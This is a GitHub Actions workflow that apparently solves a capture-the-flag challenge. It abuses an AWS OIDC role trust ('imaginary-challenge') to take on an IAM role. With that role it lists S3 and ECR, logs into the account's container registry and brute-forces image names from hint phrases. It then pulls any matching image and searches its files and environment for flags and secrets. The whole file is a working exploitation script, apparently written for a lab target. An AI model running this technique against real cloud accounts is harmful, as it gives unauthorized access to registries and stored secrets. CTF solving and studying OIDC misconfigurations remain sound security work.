name: Explore AWS ECR & Containers

on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  assume-and-explore:
    runs-on: ubuntu-latest
    env:
      AWS_REGION: us-east-1
      AWS_DEFAULT_REGION: us-east-1
    steps:
      - name: Checkout repo
        uses: actions/checkout@v4

      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
          aws-region: us-east-1

      - name: Check current AWS identity
        run: aws sts get-caller-identity

      - name: Attempt S3, ECR, and Docker exploration
        run: |
          echo "=== Checking S3 buckets ==="
          aws s3 ls || echo "No S3 list access"

          echo "=== Describe ECR repositories ==="
          aws ecr describe-repositories --region $AWS_REGION || echo "No ECR repos"

          echo "=== Get ECR auth token ==="
          aws ecr get-login-password --region $AWS_REGION | docker login --username AWS --password-stdin 396961015104.dkr.ecr.$AWS_REGION.amazonaws.com

          echo "=== Trying common phrase-based Docker images ==="
          PHRASES=(
            "never-imagined" "never_imagined" "i-never-imagined"
            "misconfigure-cloud" "misconfigured-cloud" "cloud-misconfiguration"
            "github-actions-insecure" "actions-insecure" "insecure-actions"
            "fiddling-workflow" "fiddle-workflow" "workflow-fiddling"
            "download-docker-image" "docker-download" "image-download"
            "where-docker" "from-where" "where-from"
            "oidc-cool" "cool-oidc" "oidc-misconfigured"
            "be-careful" "careful-oidc" "oidc-careful"
          )

          for phrase in "${PHRASES[@]}"; do
            echo "Trying: $phrase"
            if docker pull 396961015104.dkr.ecr.$AWS_REGION.amazonaws.com/$phrase:latest 2>/dev/null; then
              echo "ðŸŽ‰ FOUND: $phrase"
              docker images | grep $phrase
              echo "=== Exploring container contents ==="
              docker run --rm 396961015104.dkr.ecr.$AWS_REGION.amazonaws.com/$phrase:latest \
                sh -c 'find / -name "*flag*" -o -name "*secret*" -o -name "*.txt" 2>/dev/null | head -20' || \
              docker run --rm 396961015104.dkr.ecr.$AWS_REGION.amazonaws.com/$phrase:latest env | grep -i flag
              break
            fi
          done
